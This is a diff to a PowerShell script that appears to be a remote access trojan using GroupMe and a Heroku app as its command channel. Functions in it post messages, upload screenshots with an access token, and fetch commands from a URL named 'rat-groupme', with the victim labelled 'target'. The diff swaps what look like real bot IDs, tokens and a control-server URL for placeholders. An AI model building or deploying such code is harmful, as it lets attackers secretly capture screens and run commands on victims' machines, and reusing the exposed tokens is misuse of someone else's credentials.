@@ -9,7 +9,7 @@ function sendmsg() {
     $Url="https://api.groupme.com/v3/bots/post"
     $Body= @{
             text="$cmd"
-            bot_id="688958bd70cfbf125a71291636"
+            bot_id="YOUR BOT ID"
             }
     Invoke-RestMethod -Method POST -Uri $Url -Body $Body
 }
@@ -17,7 +17,7 @@ function sendmsg() {
 #send screenshots
 function sendpics() {
     $Url = "https://image.groupme.com/pictures"
-    $GM_TOKEN = "bf0c57c0007e0136a2db7fb5bd43c247"
+    $GM_TOKEN = "YOUR GROUPME GM TOKEN"
     $content = "image/jpeg"
     $dict = @{}
     $dict.Add("X-Access-Token","$GM_TOKEN")
@@ -33,7 +33,7 @@ function sendpics() {
 # Function for getting the command to run and send 
 function getcmd() {
     # Send Invoke-RestMethod Portion #
-    $Url="https://rat-groupme.herokuapp.com/post"
+    $Url="https://yourherokuappURL.herokuapp.com/post"
     $Body= @{
             "name"="target"
             "text"="yea let's try"
